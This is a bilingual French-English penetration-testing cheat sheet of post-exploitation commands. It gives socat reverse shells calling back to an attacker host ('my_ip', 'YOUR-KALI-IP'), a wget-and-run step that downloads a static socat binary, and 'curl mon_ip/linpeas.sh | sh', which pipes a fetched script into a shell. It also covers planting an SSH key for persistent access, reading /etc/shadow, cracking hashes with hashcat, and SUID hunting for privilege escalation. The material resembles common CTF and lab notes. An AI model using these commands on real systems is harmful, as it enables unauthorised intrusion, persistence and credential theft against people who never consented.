# Dans un reverse shell

## Upgrade a reverse shell to a fully TTY interactive shell

Sometimes we will get a shell but it won't be very convenient. There are some ways to upgrade your shells to interactive TTY reverse shell
if you want a quick dirty little fix but not completely interactive this python command works well for python3
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo; fg
```

## With socat
On your kali
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4440
```
From the victime machine
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440 
```

If socat is not installed see here for static binaries
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440
```
OR
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
```
In your kali then put on your python3 webserver
and then 
```bash
wget -q http://YOUR-KALI-IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR-KALI-IP:4440
```

## Pour avoir un accès ssh

```bash
ssh-keygen -f mykey
# No passphrase
mykey & mykey.pub
mv mykey.pub ~/.ssh/authorized_keys
# Copy mykey to local machine in the .ssh folder
nano mykey # and paste the private key
sudo chmod 600 mykey

ssh -i mykey user@ip
```


# Détecter un hash 

```bash
hashcat hashPWD.txt rockyou.txt

The following 11 hash-modes match the structure of your input hash:

      # | Name                                                | Category
  ======+=====================================================+======================================
    900 | MD4                                                 | Raw Hash
      0 | MD5                                                 | Raw Hash
     70 | md5(utf16le($pass))                                 | Raw Hash
   2600 | md5(md5($pass))                                     | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                    | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))             | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                         | Raw Hash salted and/or iterated
   1000 | NTLM                                                | Operating System
   9900 | Radmin2                                             | Operating System
   8600 | Lotus Notes/Domino 5                                | Enterprise Application Software (EAS)


```

Puis sélectionner le # de l'algo de hashage
Exemple avec RAW MD5
```bash
hashcat -m 0 hashPWD.txt rockyou.txt
```

# Privilege Escalation

## Linux

`sudo -l`

Link Linpeas : https://github.com/carlospolop/PEASS-ng/releases/tag/20230529-e7da582f

`python -m http.server 80 -> curl mon_ip/linpeas.sh | sh`

`find / -perms -4000 -type f 2>/dev/null`
`find / -type f -perm -04000 -ls 2>/dev/null`
`find / -perm -4000 2>/dev/null`
`find / -writable ! -user whoami -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`


# System Information

Nom d'hôte :
```bash
hostname
```

Adresse IP actuelle :
```bash
ip addr show
```
Détails de la route par défaut :

```bash
ip route
```

Informations sur les serveurs DNS :
```bash
cat /etc/resolv.conf
```

# Informations sur les utilisateurs :

Détails de l'utilisateur actuel :
```bash
id
```

Derniers utilisateurs connectés :
```bash
last
```

Utilisateurs connectés actuellement :
```bash
who
```
Liste de tous les utilisateurs avec informations uid/gid :
```bash
cat /etc/passwd
```

Liste des comptes root :
```bash
grep 'root' /etc/passwd
```

Politiques de mot de passe et méthode de stockage des mots de passe :
```bash
cat /etc/login.defs
cat /etc/shadow
```

Vérification de la valeur umask :
```bash
umask
```

Vérification de l'emplacement de stockage des hachages de mot de passe (devrait être /etc/shadow) :
```bash
grep -E ':[^\!*]' /etc/passwd
```

Extraction des détails complets pour les uid 'par défaut' tels que 0, 1000, 1001, etc. :
```bash
getent passwd 0
getent passwd 1000
getent passwd 1001
# Ajouter d'autres uid au besoin.
```

Tentative de lecture de fichiers restreints (par exemple, /etc/shadow) :
```bash
cat /etc/shadow
```

Liste des fichiers d'historique des utilisateurs actuels :
```bash
ls -la ~/.bash_history
ls -la ~/.nano_history
ls -la ~/.mysql_history
# Ajouter d'autres fichiers d'historique au besoin.
```

Vérification des utilisateurs ayant récemment utilisé sudo :
```bash
grep -E 'sudo:.*(command)' /var/log/auth.log
```

Vérification de l'accès à /etc/sudoers :
```bash
sudo -l
```

Vérification si l'utilisateur actuel a un accès Sudo sans mot de passe :
```bash
sudo -n -l
```

# Informations environnementales :

Affichage de la variable $PATH :
```bash
echo $PATH
```

Affichage des informations d'environnement :
```bash
env
```

Tâches et emplois :

Liste de toutes les tâches cron :
```bash
crontab -l
```
Localisation de toutes les tâches cron accessibles en écriture par tous :
```bash
ls -la /etc/cron*
```

Localisation des tâches cron appartenant à d'autres utilisateurs du système :
```bash
find /etc/cron* -user !root
```

Liste des timers systemd actifs et inactifs :
```bash
systemctl list-timers
```

# Services et connexions réseau :

Liste des connexions réseau TCP et UDP :
```bash
netstat -tuln
```

Liste des processus en cours d'exécution :
```bash
ps aux
```

Recherche et liste des binaires de processus et des permissions associées :
```bash
ps -ef | awk '{print $8}' | xargs -l readlink -f
```
Affichage du contenu d'inetd.conf/xined.conf et des permissions du fichier binaire associé :
```bash
cat /etc/inetd.conf
cat /etc/xinetd.conf
```


Liste des permissions binaires init.d :
```bash
ls -la /etc/init.d/
```

# Informations sur les versions :

Version de Sudo :
```bash
sudo -v
```

Version de MYSQL :
```bash
mysql --version
```

Version de Postgres :
```bash
postgres --version
```

Version d'Apache :
```bash
apache2 -v
```

Vérification de la configuration utilisateur d'Apache et des modules activés :
```bash
apachectl -M
```

Vérification des fichiers htpasswd :
```bash
find / -name ".htpasswd" -print 2>/dev/null
```

Affichage des répertoires www :
```bash
ls -la /var/www/
```


# Identifiants par défaut/faibles :

Vérification des comptes Postgres par défaut/faibles :
```bash
psql -U postgres -l
```

Vérification des comptes MYSQL par défaut/faibles :
```bash
mysql -u root -e "SELECT User, Host FROM mysql.user;"
```

# Recherches :

Localisation de tous les fichiers SUID/GUID :
```bash
find / -type f -perm /4000 -o -perm /2000
```

Localisation de tous les fichiers SUID/GUID accessibles en écriture par tous :
```bash
find / -type f -perm /6000 -o -perm /2000
```

Localisation de tous les fichiers SUID/GUID appartenant à root :
```bash
find / -type f -user root -perm /4000 -o -perm /2000
```

Localisation des fichiers SUID/GUID "intéressants" (par exemple, nmap, vim, etc.) :
```bash
find / -type f -perm /4000 -o -perm /2000 -exec ls -l {} \;
```

Localisation des fichiers avec des capacités POSIX :
```bash
getcap -r / 2>/dev/null
```

Liste de tous les fichiers accessibles en écriture par tous les utilisateurs :
```bash
find / -type f -perm /o+w
```

Recherche et affichage du contenu des fichiers *.plan accessibles :
```bash
find / -name "*.plan" -print -exec cat {} \;
```

Recherche et affichage du contenu des fichiers *.rhosts accessibles :
```bash
find / -name "*.rhosts" -print -exec cat {} \;
```

Affichage des détails du serveur NFS :
```bash
showmount -e
```

Localisation des fichiers *.conf et *.log contenant un mot-clé spécifié au moment de l'exécution du script :
```bash
grep -rnw /etc -e "mot-clé"
```

Liste de tous les fichiers *.conf dans /etc :
```bash
find /etc -name "*.conf" -type f
```

Localisation des fichiers de courrier :
```bash
find /var/mail/ -type f
```

# Tests spécifiques à la plateforme/logiciel :

Vérification pour savoir si nous sommes dans un conteneur Docker :
```bash
cat /proc/1/cgroup | grep -i docker
```

Vérification de l'installation de Docker :
```bash
docker --version
```

Vérification pour savoir si nous sommes dans un conteneur LXC :
```bash
cat /proc/1/environ | grep -q lxc
```

```py
import subprocess
subprocess.call("/bin/sh")
```
```js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```
```c
#include <stdlib.h>
#include <unistd.h>

int main() {
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
```
```cpp
#include <cstdlib>
#include <unistd.h>

int main() {
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
```
```rust
use std::process::Command;

fn main() {
    Command::new("/bin/sh")
        .status()
        .expect("Failed to execute command");
}
```
```go
package main

import (
	"os"
	"os/exec"
)

func main() {
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
```
```java
import java.io.IOException;

public class Main {
    public static void main(String[] args) {
        try {
            Process process = new ProcessBuilder("/bin/sh").inheritIO().start();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```
